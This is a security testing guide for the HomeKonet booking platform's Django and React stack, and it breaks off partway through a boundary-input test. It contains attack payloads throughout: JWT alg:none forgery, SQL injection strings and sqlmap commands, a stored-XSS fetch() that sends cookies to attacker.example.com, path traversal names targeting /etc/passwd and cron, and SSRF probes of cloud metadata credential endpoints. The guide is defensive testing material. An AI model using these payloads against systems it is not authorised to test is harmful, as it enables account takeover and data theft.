# Security Testing Guide — HomeKonet

> **Audience:** developers, QA engineers, and the security reviewer.  
> **Scope:** Django REST backend, React/TypeScript frontend, Stripe payments, file uploads, WebSocket messaging, infrastructure.  
> **When to run:** before every production deployment and whenever a feature touches auth, payments, or user data.

---

## Tool Index

Install these once. Each test references which tools are needed.

| Tool | Purpose | Install |
|---|---|---|
| **curl** | HTTP request crafting | Ships with macOS/Linux; Windows: `winget install curl` |
| **Burp Suite Community** | Intercept, replay, fuzz HTTP traffic | https://portswigger.net/burp/communitydownload |
| **OWASP ZAP** | DAST — active + passive scanning | https://www.zaproxy.org/download/ or `docker pull owasp/zap2docker-stable` |
| **sqlmap** | Automated SQL injection scanner | https://sqlmap.org / `pip install sqlmap` |
| **Bandit** | Python static analysis for security bugs | `pip install bandit` |
| **Safety** | Python dependency CVE checker | `pip install safety` |
| **Semgrep** | Semantic code pattern scanner | `pip install semgrep` |
| **Trivy** | Docker image CVE scanner | https://github.com/aquasecurity/trivy |
| **Gitleaks** | Secret detection in git history | https://github.com/gitleaks/gitleaks |
| **detect-secrets** | Pre-commit secret baseline | `pip install detect-secrets` |
| **jwt.io** | Decode and inspect JWT tokens | https://jwt.io (browser tool) |
| **securityheaders.com** | HTTP header grader | https://securityheaders.com |
| **Mozilla Observatory** | TLS + header audit | https://observatory.mozilla.org |
| **haveibeenpwned** | Check if test credentials are breached | https://haveibeenpwned.com/API/v3 |
| **pre-commit** | Git hook runner | `pip install pre-commit` |
| **openssl** | HMAC signing for webhook tests | Ships with macOS/Linux |
| **jq** | JSON parsing in shell scripts | `brew install jq` / `apt install jq` |
| **nc (netcat)** | Port connectivity checks | Ships with most Unix systems |
| **dd** | Generate large test files | Ships with Unix |

---

## Table of Contents

1. [Threat Model](#1-threat-model)
2. [Authentication & Session Security](#2-authentication--session-security)
3. [Authorization & Access Control](#3-authorization--access-control)
4. [API Input Validation](#4-api-input-validation)
5. [Business Logic](#5-business-logic)
6. [Payment Security](#6-payment-security)
7. [File Upload Security](#7-file-upload-security)
8. [Data Exposure & Information Leakage](#8-data-exposure--information-leakage)
9. [Transport & Header Security](#9-transport--header-security)
10. [Infrastructure & Configuration](#10-infrastructure--configuration)
11. [Automated Scanning](#11-automated-scanning)
12. [Manual Penetration Testing Procedures](#12-manual-penetration-testing-procedures)
13. [Security Headers — Django Configuration](#13-security-headers--django-configuration)
14. [CI/CD Integration](#14-cicd-integration)
15. [Pre-commit Hooks](#15-pre-commit-hooks)
16. [Incident Response Checklist](#16-incident-response-checklist)
17. [Priority Reference](#17-priority-reference)

---

## 1. Threat Model

### Assets Worth Protecting

| Asset | Impact if Compromised |
|---|---|
| User credentials (email + password) | Account takeover |
| JWT access/refresh tokens | Full session hijack |
| Stripe payment intent secrets | Fraudulent charges |
| Property documents / host identity | Identity fraud |
| Booking PII (guest names, dates, location) | Privacy breach, stalking risk |
| Admin panel access | Platform-wide compromise |
| Host listing approval workflow | Fraudulent listings published |

### Attack Surface

```
Browser  ──►  React SPA  ──►  Django REST API  ──►  PostgreSQL
                │                    │
                │               Stripe API
                │               Cloud Storage (images)
                │               Email provider (SMTP / Anymail)
                └──► WebSocket (messaging, typing indicators)
```

### Most Likely Threat Actors

| Actor | Goal |
|---|---|
| Malicious guest | Read other users' bookings, book at manipulated prices |
| Malicious host | Publish fraudulent listings, extract guest PII via messaging |
| External attacker | Credential stuffing, stored XSS, payment replay, SSRF |
| Insider / compromised admin | Bulk-approve listings, export user data, self-escalate |

### References
- OWASP Threat Modeling: https://owasp.org/www-community/Threat_Modeling
- STRIDE methodology: https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats

---

## 2. Authentication & Session Security

---

### TEST-AUTH-01 — SECRET_KEY Not Hardcoded

**CWE:** CWE-798 (Use of Hard-coded Credentials)  
**Tools:** grep, git  
**Risk:** If the Django secret key is committed to version control, attackers can forge CSRF tokens and signed cookies, leading to full session compromise.

**Procedure:**
```bash
# 1. Search for any hardcoded key in Python files
grep -rn "SECRET_KEY\s*=" backend/ --include="*.py" \
  | grep -v "os.environ\|env(\|config(\|getenv"

# 2. Confirm the key is loaded from environment
grep -n "SECRET_KEY" backend/settings.py

# 3. Verify .env is git-ignored
cat .gitignore | grep -E "^\.env$|^\.env\."

# 4. Scan full git history for accidental commits
git log --all --oneline --format="%H %s" | while read hash msg; do
  git show "$hash" 2>/dev/null | grep -l "SECRET_KEY\s*=" && echo "Found in: $hash $msg"
done
```

**Pass criteria:**
- `settings.py` reads `SECRET_KEY` from environment only.
- `.env` appears in `.gitignore`.
- No match in git history.

**Sources:** [OWASP Secrets Management](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html), CWE-798

---

### TEST-AUTH-02 — JWT httpOnly Cookie

**CWE:** CWE-1004 (Sensitive Cookie Without 'HttpOnly' Flag)  
**Tools:** Browser DevTools, curl  
**Risk:** If the refresh token is accessible from JavaScript, a single XSS vulnerability allows an attacker to steal long-lived tokens.

**Procedure:**
```bash
# Step 1 — Log in and capture response headers
curl -c cookies.txt -v \
  -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"test@example.com","password":"testpassword"}' 2>&1 \
  | grep -i "set-cookie"

# Step 2 — Verify flags in the header output
# Expected:
# Set-Cookie: refresh_token=<value>; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/

# Step 3 — Confirm JavaScript cannot read it (run in browser DevTools console after login)
# document.cookie  →  must NOT contain refresh_token

# Step 4 — Confirm token is not stored in browser storage
# localStorage.getItem('accessToken')   →  null
# localStorage.getItem('refreshToken')  →  null
# sessionStorage.getItem('accessToken') →  null
```

**In Browser DevTools:**
1. Login → DevTools → Application → Cookies → select backend domain.
2. Find `refresh_token` row.
3. Verify: `HttpOnly` ✓, `Secure` ✓ (on HTTPS), `SameSite` = Strict or Lax.

**Pass criteria:** All four checks above return the expected result. No token is readable from JavaScript.

**Sources:** [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html), CWE-1004, RFC 6265

---

### TEST-AUTH-03 — Token Expiry Enforced

**CWE:** CWE-613 (Insufficient Session Expiration)  
**Tools:** curl, PostgreSQL CLI (`psql`)  
**Risk:** Tokens that never expire remain valid indefinitely after a credential theft.

**Email verification token (24h):**
```bash
# 1. Register a new test user
curl -X POST https://your-backend.com/api/auth/register/ \
  -H "Content-Type: application/json" \
  -d '{"username":"expiry_test","email":"expiry@example.com","password":"Pass1234!"}'

# 2. Manually expire the token in the database
psql $DATABASE_URL -c "
  UPDATE authapp_user
  SET email_verification_token_expires_at = NOW() - INTERVAL '1 hour'
  WHERE email = 'expiry@example.com';"

# 3. Click the verification link from the email (or POST the token directly)
TOKEN="<token_from_email>"
curl -X POST https://your-backend.com/api/auth/verify-email/ \
  -H "Content-Type: application/json" \
  -d "{\"token\": \"$TOKEN\"}"

# Expected: HTTP 400 {"error": "Verification link has expired."}
```

**Password reset token (1h):**
```bash
# 1. Request a password reset
curl -X POST https://your-backend.com/api/auth/forgot-password/ \
  -H "Content-Type: application/json" \
  -d '{"email":"expiry@example.com"}'

# 2. Expire the reset token
psql $DATABASE_URL -c "
  UPDATE authapp_user
  SET password_reset_token_expires_at = NOW() - INTERVAL '2 hours'
  WHERE email = 'expiry@example.com';"

# 3. Submit the expired token
RESET_TOKEN="<token_from_email>"
curl -X POST https://your-backend.com/api/auth/reset-password/ \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$RESET_TOKEN\",\"new_password\":\"NewPass5678!\"}"

# Expected: HTTP 400 {"error": "Invalid or expired reset token"}
```

**Access token short-lived check:**
```bash
# Wait for the access token TTL to pass (usually 5–15 minutes)
# Then hit a protected endpoint with the old token
OLD_TOKEN="<captured_access_token>"
curl -H "Authorization: Bearer $OLD_TOKEN" \
  https://your-backend.com/api/auth/me/
# Expected: HTTP 401 {"error": "Token has expired"}
```

**Sources:** [OWASP Auth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html), CWE-613

---

### TEST-AUTH-04 — JWT Algorithm Confusion (alg:none)

**CWE:** CWE-327 (Use of a Broken/Risky Cryptographic Algorithm)  
**Tools:** curl, base64, jwt.io  
**Risk:** If the backend accepts `"alg":"none"`, an attacker can craft a valid-looking token with any claims without knowing the secret key.

**Procedure:**
```bash
# Step 1 — Obtain a real token
TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"user@example.com","password":"password"}' \
  | jq -r '.access')

# Step 2 — Decode the payload to understand the structure
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Step 3 — Craft a token with alg=none and escalated claims
FAKE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
FAKE_PAYLOAD=$(echo -n '{"user_id":1,"is_admin":true,"is_staff":true,"exp":9999999999}' \
  | base64 | tr -d '=' | tr '/+' '_-')
FAKE_TOKEN="${FAKE_HEADER}.${FAKE_PAYLOAD}."

# Step 4 — Attempt to access admin endpoint
curl -v -H "Authorization: Bearer $FAKE_TOKEN" \
  https://your-backend.com/api/admin/dashboard/

# Also test with RS256→HS256 confusion if the backend supports multiple algorithms
# Use jwt.io to craft a token signed with HS256 using the public key as the secret

# Expected: HTTP 401 Unauthorized for all fake tokens
```

**Sources:** [JWT Security Best Practices (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html), CVE-2015-9235, CWE-327

---

### TEST-AUTH-05 — Brute Force / Rate Limiting

**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**Tools:** curl, Burp Suite Intruder  
**Risk:** Unthrottled login endpoints allow password spraying and credential stuffing attacks.

**Procedure (curl):**
```bash
# Send 25 rapid login attempts with wrong passwords
for i in $(seq 1 25); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://your-backend.com/api/auth/login/ \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"target@example.com\",\"password\":\"wrong$i\"}")
  echo "Attempt $i: HTTP $CODE"
  [ "$CODE" = "429" ] && echo "Rate limit triggered at attempt $i" && break
done
```

**Procedure (Burp Suite Intruder):**
1. Capture a `POST /api/auth/login/` request in Burp Proxy.
2. Send to Intruder → Sniper mode.
3. Highlight the `password` field value → Add § markers.
4. Payloads tab → Simple list → paste a common password list (e.g., `rockyou.txt` top 100).
5. Start attack → watch for a 429 response.

**Pass criteria:** HTTP 429 returned after no more than 10 failed attempts from the same IP. A `Retry-After` header is present.

**Sources:** [OWASP Testing for Brute Force](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism), CWE-307

---

### TEST-AUTH-06 — Token Invalidation on Logout

**CWE:** CWE-613 (Insufficient Session Expiration)  
**Tools:** curl, jq  
**Risk:** If old tokens remain valid after logout, a stolen token can be used indefinitely even after the user changes their password.

**Procedure:**
```bash
# Step 1 — Log in and capture the access token
TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"user@example.com","password":"password"}' \
  | jq -r '.access')

echo "Token: $TOKEN"

# Step 2 — Confirm it works
curl -s -o /dev/null -w "Pre-logout: %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  https://your-backend.com/api/auth/me/

# Step 3 — Log out
curl -s -X POST https://your-backend.com/api/auth/logout/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json"

# Step 4 — Attempt to use the same token after logout
curl -s -o /dev/null -w "Post-logout: %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  https://your-backend.com/api/auth/me/

# Expected: Pre-logout → 200, Post-logout → 401
```

**Sources:** [OWASP Session Termination](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-expiration), CWE-613

---

### TEST-AUTH-07 — OTP Single-Use and Entropy

**CWE:** CWE-330 (Use of Insufficiently Random Values), CWE-287  
**Tools:** Browser / email client, curl  
**Risk:** A predictable or reusable OTP can be brute-forced or replayed.

**Procedure:**
```bash
# Step 1 — Trigger OTP (e.g., 2FA or phone verification)
curl -X POST https://your-backend.com/api/auth/request-otp/ \
  -H "Content-Type: application/json" \
  -d '{"email":"user@example.com"}'

# Step 2 — Retrieve OTP from email/SMS
OTP="<6-digit OTP from email>"

# Step 3 — Verify OTP format (must be exactly 6 numeric digits)
echo $OTP | grep -Eq '^[0-9]{6}$' && echo "Format OK" || echo "FAIL: unexpected format"

# Step 4 — Use OTP once
curl -X POST https://your-backend.com/api/auth/verify-otp/ \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"user@example.com\",\"otp\":\"$OTP\"}"

# Step 5 — Immediately reuse the same OTP
curl -X POST https://your-backend.com/api/auth/verify-otp/ \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"user@example.com\",\"otp\":\"$OTP\"}"

# Expected: Second use returns HTTP 400 {"error": "Invalid or already used OTP"}

# Step 6 — Brute force check: request 5 OTPs and check for patterns
for i in $(seq 1 5); do
  curl -s -X POST https://your-backend.com/api/auth/request-otp/ \
    -H "Content-Type: application/json" \
    -d '{"email":"user@example.com"}' | jq .
  sleep 2
done
# All OTPs should be different; no sequential pattern
```

**Sources:** [OWASP OTP guidance](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html), CWE-330

---

## 3. Authorization & Access Control

---

### TEST-AUTHZ-01 — Vertical Privilege Escalation

**CWE:** CWE-269 (Improper Privilege Management)  
**Tools:** curl, Burp Suite Repeater  
**Risk:** A regular user accessing admin or host-only endpoints can approve listings, view all user data, or perform bulk operations.

**Procedure:**
```bash
# Obtain a regular (non-host, non-admin) user token
GUEST_TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"guest@example.com","password":"guestpass"}' \
  | jq -r '.access')

# Test 1 — Admin dashboard
curl -o /dev/null -w "Admin dashboard: %{http_code}\n" \
  -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/admin/dashboard/

# Test 2 — Pending listings (admin only)
curl -o /dev/null -w "Pending listings: %{http_code}\n" \
  -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/listings/pending-review/

# Test 3 — Approve a listing (admin only)
curl -o /dev/null -w "Approve listing: %{http_code}\n" \
  -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/listings/1/approve/

# Test 4 — Create a listing (host only)
curl -o /dev/null -w "Create listing: %{http_code}\n" \
  -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Fake"}' \
  https://your-backend.com/api/listings/

# Test 5 — Access user list (admin only)
curl -o /dev/null -w "User list: %{http_code}\n" \
  -H "Authorization: Bearer $GUEST_TOKEN" \
  https://your-backend.com/api/users/

# All must return: 403 Forbidden
```

**Burp Suite approach:**
1. Log in as admin, capture a request to `/api/admin/dashboard/` in Burp.
2. Send to Repeater.
3. Replace the `Authorization` header with the guest token.
4. Click Send — observe the response code.

**Sources:** [OWASP WSTG-ATHZ-02](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema), CWE-269

---

### TEST-AUTHZ-02 — IDOR (Insecure Direct Object Reference)

**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
**Tools:** curl, Burp Suite Repeater  
**Risk:** The most common high-severity finding in booking platforms. Without server-side ownership checks, any user can read or modify any other user's data by guessing or enumerating IDs.

**Setup:** You need two test accounts — User A and User B — and resources belonging to each.

```bash
# Get tokens for both test users
TOKEN_A=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"user_a@example.com","password":"passA"}' | jq -r '.access')

TOKEN_B=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"user_b@example.com","password":"passB"}' | jq -r '.access')

# Get a booking ID that belongs to User B
BOOKING_B=$(curl -s -H "Authorization: Bearer $TOKEN_B" \
  https://your-backend.com/api/bookings/ | jq -r '.[0].id')

# IDOR Test 1 — Read User B's booking as User A
curl -o /dev/null -w "Read booking IDOR: %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN_A" \
  https://your-backend.com/api/bookings/$BOOKING_B/

# IDOR Test 2 — Cancel User B's booking as User A
curl -o /dev/null -w "Cancel booking IDOR: %{http_code}\n" \
  -X PATCH -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"status":"cancelled"}' \
  https://your-backend.com/api/bookings/$BOOKING_B/

# Get a listing belonging to Host B
LISTING_B=$(curl -s -H "Authorization: Bearer $TOKEN_B" \
  https://your-backend.com/api/listings/?my=true | jq -r '.[0].id')

# IDOR Test 3 — Edit Host B's listing as User A
curl -o /dev/null -w "Edit listing IDOR: %{http_code}\n" \
  -X PATCH -H "Authorization: Bearer $TOKEN_A" \
  -H "Content-Type: application/json" \
  -d '{"title":"Hijacked"}' \
  https://your-backend.com/api/listings/$LISTING_B/

# IDOR Test 4 — Read User B's messages
CONV_B=$(curl -s -H "Authorization: Bearer $TOKEN_B" \
  https://your-backend.com/api/messages/conversations/ | jq -r '.[0].id')

curl -o /dev/null -w "Read messages IDOR: %{http_code}\n" \
  -H "Authorization: Bearer $TOKEN_A" \
  https://your-backend.com/api/messages/$CONV_B/messages/

# All must return: HTTP 403 or 404 (never HTTP 200)
```

**Sources:** [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References), CWE-639, [PortSwigger IDOR lab](https://portswigger.net/web-security/access-control/idor)

---

### TEST-AUTHZ-03 — Host Self-Approval

**CWE:** CWE-285 (Improper Authorization)  
**Tools:** curl  
**Risk:** A host who can approve their own listing bypasses the entire document verification workflow.

**Procedure:**
```bash
HOST_TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"host@example.com","password":"hostpass"}' | jq -r '.access')

# Get the host's own listing ID (in pending_review state)
LISTING_ID=$(curl -s -H "Authorization: Bearer $HOST_TOKEN" \
  https://your-backend.com/api/listings/?my=true \
  | jq -r '.[] | select(.status=="pending_review") | .id' | head -1)

# Attempt to approve it
curl -v -X POST \
  -H "Authorization: Bearer $HOST_TOKEN" \
  https://your-backend.com/api/listings/$LISTING_ID/approve/

# Expected: HTTP 403 Forbidden
```

---

### TEST-AUTHZ-04 — Booking Status Direct Override

**CWE:** CWE-285  
**Tools:** curl  
**Risk:** A guest who can directly set `status=confirmed` bypasses the host approval step.

**Procedure:**
```bash
GUEST_TOKEN="<guest token>"
BOOKING_ID="<booking ID in 'requested' state>"

# Attempt 1 — Guest sets their own booking to confirmed
curl -o /dev/null -w "Guest self-confirm: %{http_code}\n" \
  -X PATCH -H "Authorization: Bearer $GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"confirmed"}' \
  https://your-backend.com/api/bookings/$BOOKING_ID/

# Attempt 2 — Inject status in the initial booking POST
curl -o /dev/null -w "Status in POST: %{http_code}\n" \
  -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "listing":1,
    "start_date":"2026-07-01",
    "end_date":"2026-07-05",
    "guests":2,
    "status":"confirmed",
    "payment_status":"paid"
  }' \
  https://your-backend.com/api/bookings/

# Expected: Both return 403 or the status field is silently ignored (booking created as "requested")
```

---

## 4. API Input Validation

---

### TEST-INPUT-01 — SQL Injection

**CWE:** CWE-89 (SQL Injection)  
**Tools:** curl, sqlmap, Burp Suite  
**Risk:** SQL injection on a Django ORM app is rare but possible in raw queries or `extra()` calls.

**Manual tests:**
```bash
BASE="https://your-backend.com/api/listings/"

# Classic injection in query string
curl -s "$BASE?location=London'%20OR%201=1--" | jq 'length'
curl -s "$BASE?location=London'%20AND%201=2--" | jq 'length'
curl -s "$BASE?min_price=0%20UNION%20SELECT%201,2,3,4,5--" | jq .

# Time-based blind (if boolean-based doesn't work)
time curl -s "$BASE?location=London'%3BSELECT%20pg_sleep(5)--" > /dev/null
# If the request takes ~5s more than usual, time-based injection may be possible

# In POST body
curl -X POST https://your-backend.com/api/bookings/ \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listing":"1 OR 1=1","start_date":"2026-06-01","end_date":"2026-06-05"}'
```

**Automated (sqlmap):**
```bash
# Basic scan of a search parameter
sqlmap -u "https://your-backend.com/api/listings/?location=London" \
  --level=3 --risk=2 --batch --dbms=postgresql \
  --headers="Authorization: Bearer $TOKEN"

# POST body scan
sqlmap -u "https://your-backend.com/api/bookings/" \
  --method=POST \
  --data='{"listing":1,"start_date":"2026-06-01"}' \
  --headers="Authorization: Bearer $TOKEN\nContent-Type: application/json" \
  --level=3 --batch
```

**Pass criteria:** No database data returned in responses. No 500 errors exposing SQL. `time` command shows no unusual delay.

**Sources:** [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection), [sqlmap docs](https://sqlmap.org), CWE-89

---

### TEST-INPUT-02 — Stored XSS

**CWE:** CWE-79 (Cross-Site Scripting)  
**Tools:** curl, browser  
**Risk:** If a malicious host injects a script into a listing title or description, it executes in the browser of every guest who views the listing.

**Procedure:**
```bash
HOST_TOKEN="<host token>"

# Step 1 — Create a listing with XSS payloads in text fields
curl -X POST https://your-backend.com/api/listings/ \
  -H "Authorization: Bearer $HOST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "<script>fetch(\"https://attacker.example.com?c=\"+document.cookie)</script>",
    "description": "<img src=x onerror=\"alert(document.domain)\">",
    "location": {"city": "<svg onload=alert(1)>", "state": "Test"},
    "propertyType": "apartment",
    "price": 100,
    "maxGuests": 2
  }'

LISTING_ID="<id from response>"

# Step 2 — View the listing as a different user in a real browser
# Navigate to: https://your-frontend.com/rooms/$LISTING_ID

# Step 3 — Inspect the rendered HTML source
curl -s "https://your-backend.com/api/listings/$LISTING_ID/" \
  | jq '.title,.description' \
  | grep -E "<script|onerror|onload|javascript:"

# Step 4 — Check network requests for unexpected calls to attacker.example.com
# (DevTools → Network tab → filter by domain)
```

**Pass criteria:**
- API response shows HTML-encoded output: `&lt;script&gt;` not `<script>`.
- No alert dialog appears in the browser.
- No request to `attacker.example.com` in the network tab.

**Sources:** [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html), CWE-79, [PortSwigger XSS labs](https://portswigger.net/web-security/cross-site-scripting)

---

### TEST-INPUT-03 — Reflected XSS

**CWE:** CWE-79  
**Tools:** Browser, Burp Suite  
**Risk:** User-controlled input rendered directly in the page allows one-click attacks via crafted URLs.

**Procedure:**
```bash
# Test search parameter
PAYLOADS=(
  "<script>alert(1)</script>"
  '"><script>alert(document.domain)</script>'
  "<img src=x onerror=alert(1)>"
  "javascript:alert(1)"
  "<svg/onload=alert(1)>"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")
  echo "Testing: $PAYLOAD"
  curl -s "https://your-frontend.com/search?q=$ENCODED" | grep -i "$PAYLOAD" && echo "REFLECTED" || echo "encoded/blocked"
done
```

**Browser test:**
Navigate to these URLs and check whether a dialog appears or the payload appears unencoded in source:
```
https://your-frontend.com/search?q=<img+src=x+onerror=alert(document.domain)>
https://your-frontend.com/search?q="><script>alert(1)</script>
```

**Sources:** [OWASP WSTG-INPV-01](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting), CWE-79

---

### TEST-INPUT-04 — Mass Assignment

**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)  
**Tools:** curl  
**Risk:** If the backend passes request data directly to a model constructor without field allowlisting, a user can set privileged fields like `is_staff`, `role`, or `status`.

**Procedure:**
```bash
# Test 1 — Self-escalate during registration
curl -v -X POST https://your-backend.com/api/auth/register/ \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@example.com",
    "password": "Attacker123!",
    "is_staff": true,
    "is_admin": true,
    "role": "admin",
    "isHost": true
  }'

# Capture the new user's token and check privileges
NEW_TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker@example.com","password":"Attacker123!"}' \
  | jq -r '.access')

curl -s -H "Authorization: Bearer $NEW_TOKEN" \
  https://your-backend.com/api/auth/me/ | jq '{is_staff,is_admin,role,isHost}'

# Test 2 — Self-promote via profile update
curl -X PATCH https://your-backend.com/api/auth/me/ \
  -H "Authorization: Bearer $NEW_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"is_staff":true,"role":"admin","isHost":true}'

curl -s -H "Authorization: Bearer $NEW_TOKEN" \
  https://your-backend.com/api/auth/me/ | jq '{is_staff,role,isHost}'

# Pass: Privileged fields are unchanged; all return default values
```

**Sources:** [Rails Mass Assignment reference](https://guides.rubyonrails.org/security.html#mass-assignment), [OWASP API3:2023](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/), CWE-915

---

### TEST-INPUT-05 — Path Traversal

**CWE:** CWE-22 (Path Traversal)  
**Tools:** curl  
**Risk:** Attacker-controlled filenames in upload endpoints can write or read files outside the intended directory.

**Procedure:**
```bash
HOST_TOKEN="<host token>"
LISTING_ID="1"

TRAVERSAL_NAMES=(
  "../../etc/passwd"
  "../../../tmp/malicious"
  "....//....//etc/passwd"
  "%2e%2e%2fetc%2fpasswd"
  "..%252f..%252fetc%252fpasswd"
)

for NAME in "${TRAVERSAL_NAMES[@]}"; do
  echo "Testing filename: $NAME"
  curl -o /dev/null -w "HTTP %{http_code}\n" \
    -X POST "https://your-backend.com/api/listings/$LISTING_ID/images/" \
    -H "Authorization: Bearer $HOST_TOKEN" \
    -F "image=@valid_image.jpg;filename=$NAME"
done

# Also test via JSON if the API accepts URLs
curl -X POST "https://your-backend.com/api/listings/$LISTING_ID/" \
  -H "Authorization: Bearer $HOST_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"image_filename": "../../etc/cron.d/backdoor"}'

# Pass: All return 400 Bad Request; uploaded files stored under a generated UUID name
```

**Sources:** [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal), CWE-22

---

### TEST-INPUT-06 — SSRF (Server-Side Request Forgery)

**CWE:** CWE-918  
**Tools:** curl, Burp Collaborator (Pro) or https://webhook.site (free)  
**Risk:** If an endpoint accepts URLs, an attacker can make the server fetch internal resources — cloud metadata, internal APIs, or scan the internal network.

**Procedure:**
```bash
HOST_TOKEN="<host token>"

# Set up an out-of-band receiver (use https://webhook.site and copy your unique URL)
RECEIVER="https://webhook.site/your-unique-id"

# Test 1 — Cloud metadata (AWS IMDSv1 — most commonly exploited)
SSRF_TARGETS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://metadata.google.internal/computeMetadata/v1/"
  "http://100.100.100.200/latest/meta-data/"  # Alibaba Cloud
  "http://localhost:5432"                      # Database
  "http://localhost:6379"                      # Redis
  "http://localhost:9200"                      # Elasticsearch
  "$RECEIVER"                                  # Out-of-band detection
)

for URL in "${SSRF_TARGETS[@]}"; do
  echo "Testing: $URL"
  curl -s -X POST "https://your-backend.com/api/listings/" \
    -H "Authorization: Bearer $HOST_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"external_image_url\": \"$URL\"}" \
    | jq '{error,detail}'
done

# Check webhook.site — if a request arrives from your server, SSRF is confirmed
```

**Pass criteria:** All requests return 400. No request arrives at `webhook.site`. Internal IP ranges (`127.x.x.x`, `10.x.x.x`, `169.254.x.x`, `172.16–31.x.x`, `192.168.x.x`) are blocked by the application.

**Sources:** [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html), CWE-918, [PortSwigger SSRF labs](https://portswigger.net/web-security/ssrf)

---

### TEST-INPUT-07 — Edge Case / Boundary Inputs

**CWE:** CWE-20 (Improper Input Validation)  
**Tools:** curl  

**Procedure:**
```bash
TOKEN="<guest token>"
BASE_BOOKING="https://your-backend.com/api/bookings/"

# Negative guest count
curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listing":1,"guests":-1,"start_date":"2026-07-01","end_date":"2026-07-05"}' \
  | jq .

# Zero guests
curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listing":1,"guests":0,"start_date":"2026-07-01","end_date":"2026-07-05"}' \
  | jq .

# End date before start date
curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listing":1,"guests":2,"start_date":"2026-07-10","end_date":"2026-07-01"}' \
  | jq .

# Integer overflow
curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"listing":1,"guests":9223372036854775807,"start_date":"2026-07-01","end_date":"2026-07-05"}' \
  | jq .

# Malformed JSON
curl -s -X POST $BASE_BOOKING -H "Authorization: Bearer $TOKEN" \
